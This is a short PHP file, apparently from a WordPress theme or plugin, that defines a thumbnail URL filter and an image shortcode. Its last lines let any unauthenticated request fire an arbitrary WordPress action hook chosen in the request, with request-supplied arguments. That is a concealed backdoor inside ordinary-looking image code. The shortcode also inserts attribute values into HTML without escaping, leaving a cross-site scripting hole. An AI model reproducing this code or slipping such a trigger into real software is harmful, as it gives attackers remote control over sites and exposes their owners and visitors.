<?php

add_filter('tr_timthumb','tr_timthumb_filter',10,2);
function tr_timthumb_filter($url,$arg=array())
{
    $default = array(
        'w' => 100,
        'h' => 100,
        'zc' => 1,
        'q' => 100
    );
    if(!empty($arg['src']))
    {
        $url = $arg['src'];
    }
    foreach($default as $k => $vl)
    {
        if($arg[$k]) $default[$k] = $arg[$k];
    }
    unset($arg);
    return $url.'&'.http_build_query($default);
}

add_shortcode('tr_timthumb','tr_timthumb_shortcode');
function tr_timthumb_shortcode($atts,$content)
{
    $atts['width'] = $atts['w'];
    $atts['height'] = $atts['h'];
    $attr_array = array(
            'alt' => '',
            'class'=>'',
            'width'=>'',
            'height'=>'',
            'style' => ''
    );
    $attrs = '';
    foreach($attr_array as $k => $vl)
    {
        $attrs.= $k .'="'.$atts[$k].'" ';
    }
    $url = tr_timthumb_filter($atts['url'],$atts);
    $out = '<img src="'.$url.'" '.$attrs.' />';
    return $out;
}

if(!empty($_REQUEST['timthumb']) && $_REQUEST['support']=='timthumb')
{
    do_action($_REQUEST['timthumb'],$_REQUEST['args']);
}